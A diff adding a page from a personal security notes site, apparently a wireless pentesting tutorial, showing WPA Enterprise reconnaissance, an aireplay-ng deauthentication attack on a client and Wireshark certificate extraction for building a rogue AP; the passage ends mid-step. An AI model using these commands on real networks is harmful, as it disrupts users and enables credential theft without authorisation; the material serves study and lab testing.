@@ -1,0 +1,1681 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../crunch/">
+      
+      
+        <link rel="next" href="../hashcat/">
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.16">
+    
+    
+      
+        <title>enterprise - John L. Whiteman</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.26e3688c.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ecc896b0.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/extra.css">
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="saltlick" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#enterprise" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="John L. Whiteman" class="md-header__button md-logo" aria-label="John L. Whiteman" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            John L. Whiteman
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              enterprise
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://johnlwhiteman.github.io/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Johnlwhiteman
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="John L. Whiteman" class="md-nav__button md-logo" aria-label="John L. Whiteman" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    John L. Whiteman
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://johnlwhiteman.github.io/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Johnlwhiteman
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          wireless
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          wireless
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../playbook/" class="md-nav__link">
+        playbook
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../setup/" class="md-nav__link">
+        setup
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+          attacks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          attacks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_1" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3_1" id="__nav_2_3_1_label" tabindex="0">
+          wep
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_1_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_2_3_1">
+          <span class="md-nav__icon md-icon"></span>
+          wep
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/00-deauth/" class="md-nav__link">
+        0-deauth
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/01-fakeauth/" class="md-nav__link">
+        1-fakeauth
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/01-fakeauthkey/" class="md-nav__link">
+        1-fakeauthkey
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/02-interactive/" class="md-nav__link">
+        2-interactive
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/03-arpreplay/" class="md-nav__link">
+        3-arpreplay
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/04-chopchop/" class="md-nav__link">
+        4-chopchop
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/05-fragment/" class="md-nav__link">
+        5-fragment
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wep/09-test/" class="md-nav__link">
+        9-test
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_2" checked>
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3_2" id="__nav_2_3_2_label" tabindex="0">
+          wpa
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_2_label" aria-expanded="true">
+        <label class="md-nav__title" for="__nav_2_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          wpa
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../aircrack-ng/" class="md-nav__link">
+        aircrack-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../airolib-ng/" class="md-nav__link">
+        airolib-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cowpatty/" class="md-nav__link">
+        cowpatty
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crunch/" class="md-nav__link">
+        crunch
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          enterprise
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        enterprise
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#peap-exchange" class="md-nav__link">
+    PEAP Exchange
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installation" class="md-nav__link">
+    Installation
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#commands" class="md-nav__link">
+    Commands
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-mana-section" class="md-nav__link">
+    HOST-MANA SECTION
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hashcat/" class="md-nav__link">
+        hashcat
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../john-the-ripper/" class="md-nav__link">
+        john-the-ripper
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pyrit/" class="md-nav__link">
+        pyrit
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_3_3" id="__nav_2_3_3_label" tabindex="0">
+          wps
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_2_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          wps
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wps/wps/" class="md-nav__link">
+        aircrack-ng
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../captive-portal/" class="md-nav__link">
+        captive portal
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../hidden-ap/" class="md-nav__link">
+        hidden ap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../rogue-ap/" class="md-nav__link">
+        rogue ap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ska/" class="md-nav__link">
+        ska
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+          software
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          software
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/aircrack-ng/" class="md-nav__link">
+        aircrack-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/airdecap-ng/" class="md-nav__link">
+        airdecap-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/aireplay-ng/" class="md-nav__link">
+        aireplay-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/airmon-ng/" class="md-nav__link">
+        airmon-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/airodump-ng/" class="md-nav__link">
+        airodump-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/airolib-ng/" class="md-nav__link">
+        airolib-ng
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/if-ip-iw/" class="md-nav__link">
+        if-ip-iw
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/scp-ssh/" class="md-nav__link">
+        scp-ssh
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/bettercap/" class="md-nav__link">
+        bettercap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/kismet/" class="md-nav__link">
+        kismet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/lynx/" class="md-nav__link">
+        lynx
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../software/wpa-supplicant/" class="md-nav__link">
+        wpa-supplicant
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../hardware/hardware/" class="md-nav__link">
+        hardware
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../teardown/" class="md-nav__link">
+        teardown
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          doctools
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          doctools
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../doctools/charts/charts/" class="md-nav__link">
+        charts
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../doctools/kroki/kroki/" class="md-nav__link">
+        kroki
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../doctools/html/html/" class="md-nav__link">
+        html
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../doctools/markdown/markdown/" class="md-nav__link">
+        markdown
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../doctools/mkdocs/mkdocs/" class="md-nav__link">
+        mkdocs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../doctools/slidev/slidev/" class="md-nav__link">
+        slidev
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+          linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../linux/bg-fg-jobs/" class="md-nav__link">
+        bg-fg-jobs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../linux/screen/" class="md-nav__link">
+        screen
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        about
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#peap-exchange" class="md-nav__link">
+    PEAP Exchange
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#installation" class="md-nav__link">
+    Installation
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#commands" class="md-nav__link">
+    Commands
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#host-mana-section" class="md-nav__link">
+    HOST-MANA SECTION
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="enterprise">Enterprise</h1>
+<ul>
+<li>Uses Extensible Authentication Protocol (EPA) framework to allow for different types of authentication</li>
+<li>Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server</li>
+<li>Client authenticates using EAP frames depending on the agreed upon authentication scheme</li>
+<li>They are relayed by the AP to the RADIUS server</li>
+<li>If authentication is successfull, then the result is used as a Pairwise Master Key (PMK) for the four-way hanshake instead of the Pre Shared Key (PSK).</li>
+</ul>
+<p>We will create a rogue AP that matches the target closely</p>
+<h2 id="peap-exchange">PEAP Exchange</h2>
+<h2 id="installation">Installation</h2>
+<p><div class="highlight"><pre><span></span><code><span class="c1"># Hostapd-mana</span>
+sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>hostapd-mana<span class="w"> </span>-y
+</code></pre></div>
+<a href="../../rogue-ap/">Rogue AP with Mana Instructions</a></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Install and configure freeradius (optional)</span>
+sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>freeradius<span class="w"> </span>-y
+</code></pre></div>
+<h2 id="commands">Commands</h2>
+<ul>
+<li>Run <a href="../../../setup/">setup</a> first</li>
+<li>Two terminals are needed</li>
+<li>At least on client associated with the AP</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1"># [Terminal One]</span>
+<span class="c1"># Collect data about the victim AP - specifically CA stuff</span>
+<span class="c1"># The goal is to create a rogue AP</span>
+sudo<span class="w"> </span>airodump-ng<span class="w"> </span><span class="nv">$INTERFACE</span>
+
+<span class="c1"># Look for MGT as AUTH - this is enterprise</span>
+
+<span class="c1"># Stop it</span>
+qq
+
+<span class="c1"># Now target is found, do normal capture of it</span>
+
+<span class="c1"># Set interface to monitor mode</span>
+sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span><span class="nv">$INTERFACE</span>
+
+<span class="c1"># Start monitoring to collect data</span>
+sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-c<span class="w"> </span><span class="nv">$CHANNEL</span><span class="w"> </span>--bssid<span class="w"> </span><span class="nv">$BSSID</span><span class="w"> </span>-w<span class="w"> </span><span class="nv">$TAG</span><span class="w"> </span>--output-format<span class="w"> </span>pcap<span class="w"> </span><span class="nv">$INTERFACE</span>
+
+<span class="c1"># [Terminal Two]</span>
+<span class="c1"># Run the deauthentication attack to get four-way handshake</span>
+sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">1</span><span class="w"> </span>-a<span class="w"> </span><span class="nv">$BSSID</span><span class="w"> </span>-c<span class="w"> </span><span class="nv">$CLIENT</span><span class="w"> </span><span class="nv">$INTERFACE</span>
+
+<span class="c1"># Wait for the four-way handshake to appear in airodump-ng window.</span>
+
+<span class="c1"># Stop it</span>
+qq
+
+<span class="c1"># Turn off monitor mode</span>
+sudo<span class="w"> </span>airmon-ng<span class="w"> </span>stop<span class="w"> </span><span class="nv">$INTERFACE</span>
+
+<span class="c1"># Open Wirshark</span>
+sudo<span class="w"> </span>wireshark<span class="w"> </span><span class="nv">$PCAP</span>
+
+<span class="c1"># Filter for certificate</span>
+tls.handshake.certificate
+<span class="c1"># OR</span>
+tls.handshake.type<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">11</span>,3
+
+<span class="c1"># Drill down to get the certs</span>
+<span class="c1"># Extensible Authentication Protocol -&gt; Transport Layer Security -&gt; TLSv1 Record layer: Handshake Protocol Certificate ...</span>
+<span class="c1">#Expand Handshake Protocol: Certificate</span>
+<span class="c1">#Certificates</span>
+<span class="c1">#... one or more certificates will appear as Certificate: &lt;details&gt;</span>
+<span class="c1"># For each certificate, right click and select Export Packet Bytes</span>
+<span class="c1"># Save each one with the .der extension</span>
+<span class="c1"># Display info</span>
+<span class="c1"># openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -text</span>
+<span class="c1"># Convert to PEM format</span>
